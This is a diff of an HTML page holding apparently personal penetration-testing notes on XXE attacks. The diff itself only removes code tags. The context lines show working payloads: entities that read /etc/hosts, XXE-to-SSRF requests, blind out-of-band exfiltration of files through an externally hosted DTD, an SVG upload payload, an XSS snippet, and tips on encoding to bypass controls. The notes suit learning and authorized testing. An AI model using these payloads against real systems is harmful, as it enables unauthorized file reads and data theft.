@@ -16,8 +16,6 @@
      
 <h2>1. GENERAL INFORMATION</h2>  
 
-<code>
-
 NOTES:<br><br>
 1. Important to inspect the requests/responses, if XML code is present there's a chance to attempt XXE.<br>
 2. Each time you find a site to upload files and the .xml extention is allowed, XXE attempts are needed. <br>
@@ -33,13 +31,9 @@ NOTE:<br> <br>
 - xsl = extensible stylesheet language | it is the style sheet of XML. so it can be invoked similar as we do with XML
 attacks.<br><br>
 
-<xsl:stylesheet version="1.0"> &lt;&sol;xsl:stylesheet>
-
-</code>          
+<xsl:stylesheet version="1.0"> &lt;&sol;xsl:stylesheet>     
 
 <h2>2. EXTERNAL ENTITIES</h2> 
-
-<code>
 
 1. Traffic inspection is needed. [burpsuite]<br><br>
 
@@ -61,13 +55,9 @@ XSS: &lt;&excl;[CDATA[&lt;script&gt;alert('stored XXS!')&lt;&sol;script>]]><br><
 
 - The name "CUMBIA" is the entity/variable name used to call /etc/hosts externally, it is invoked into the XML file and invoke 
 it using one input field. !!!! Special section to put the XML code, between initial tag and function. CHECK SAMPLE!<br>
-Modify the name as you want.
-
-</code>          
+Modify the name as you want.        
 
 <h2>3. CROSS ATTACKS</h2>  
-
-<code>
 
 <u>XXE to SSRF</u><br><br>
 
@@ -79,13 +69,9 @@ GET DATA: &lt;&excl;DOCTYPE attempt [ &lt;&excl;ENTITY VAR_NAME SYSTEM "http://I
 Sometimes each time you find and call a URL path, probably the application will be printing the current/next path in action. Try to 
 see if others paths provide more information.<br><br>
 
-</code>
-
 <h2>4. BLIND TECHNIQUES</h2>  
 
 <u>VIA ERROR MESSAGES</u> <br><br>
-
-<code>
 
 NOTES:<br><br>
 - If the app is returning errors in regards XML parsing, technically that flaw can be abused to retrieve error messages. <br>
@@ -93,24 +79,18 @@ NOTES:<br><br>
 - Sometimes it is required two entities, one to define the file to exfil and the second one to try to read and generate the error.
 For that two functions are needed. exfil | eval<br>
 - Out-of-band communications can help to discover this flaw. That is why sometimes is needed to use an external exploit server to 
-host the exploit file. <br><br>
+host the exploit file. <br><br>        
 
-</code>          
-
-<u>ATTACK SAMPLE:</u><br><br>
-
-<code>          
+<u>ATTACK SAMPLE:</u><br><br>      
 
 As it is a blind technique, an external exploit server to host the entities is needed. This flaw can be triggered locally, however, 
-external interaction is required.</code><br><br>
+external interaction is required.<br><br>
 
 <u>EXPLOIT SERVER HOSTING ENTITIES</u><br><br>
 
-<code>URL: https://URL/exploit</code><br><br>
+URL: https://URL/exploit<br><br>
 
 <u>STEP ONE: EXPLOIT FILE | CUMBIA.html</u><br><br>
-
-<code>
 
 &lt;&excl;DOCTYPE html&gt;<br>
 &lt;html&gt;<br>
@@ -133,22 +113,14 @@ NOTE:<br> <br>
 ENTITY TO EXFIL:  &lt;&excl;ENTITY % eval " &lt;&excl;ENTITY % exfil SYSTEM 'file:///404FILE/%file;'>"><br>
 ENTITY TO GENERATE ERROR:  &lt;&excl;ENTITY % eval " &lt;&excl;ENTITY % error SYSTEM 'file:///404FILE/%file;'>"><br><br>
 
-</code>
-
 <u>STEP TWO: INSERT DTD</u><br><br>
-
-<code>
 
 &lt;&excl;DOCTYPE attempt [&lt;&excl;ENTITY % VAR_NAME SYSTEM "http://DTD-URL/CUMBIA.html"> %VAR_NAME;]><br><br>
 
 NOTE:<br> <br>
 - very important to encode, encoding to base64, URL encode, etc. one time, two times, can bypass a lot of controls.
 
-</code>
-
 <h2>5. EXPLOTE XInlcude</h2>  
-
-<code>
 
 NOTES:<br><br>
 - Is a part of the XML specification that allows an XML document to be built from sub-documents.<br>
@@ -163,11 +135,7 @@ SAMPLE:<br><br>
 xmlns, means the body structure of the file.<br> 
 xi, used to add attributes, <br><br>sample: href, parsing, etc. 
 
-</code>
-
 <h2>6. XXE via FILE UPLOAD</h2>  
-
-<code>
 
 it is important to note about possible options to upload files.<br><br>
 
@@ -183,13 +151,9 @@ payload:<br><br>
 height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" 
 y="16">&xxe;&lt;&sol;text>&lt;&sol;svg><br><br>
 
-it is added same format as RFI or LFI attacks.
-
-</code>          
+it is added same format as RFI or LFI attacks.        
 
 <h2>7. XXE TO RETRIEVE DATA</h2>  
-
-<code>
 
 - in order to exploit this one, you will need to reuse an existing DTD that is stored on the server, you will use it as benefit for
 the attack.<br>
@@ -219,13 +183,7 @@ NOTE:<br> <br>
 - docbookx.dtd is a common DTD found on GNOME desktop.<br><br>
 It is pretty important to understand how the local DTD works in order to use it, as it will be invoked. 
 
-</code>
-
-
     </article>
-
-
   </main>
-
 </body>
 </html>
